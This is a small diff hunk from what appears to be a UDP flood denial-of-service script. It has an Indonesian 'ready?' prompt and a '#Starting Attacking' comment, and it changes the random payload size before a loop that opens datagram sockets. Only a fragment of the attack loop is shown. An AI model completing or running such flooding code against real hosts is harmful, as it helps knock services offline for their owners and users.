@@ -29,7 +29,7 @@ choice = str(input("=====> Siap? (y/n) : "))
 #Starting Attacking
 
 def run():
-	data = random._urandom(1024)
+	data = random._urandom(577)
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
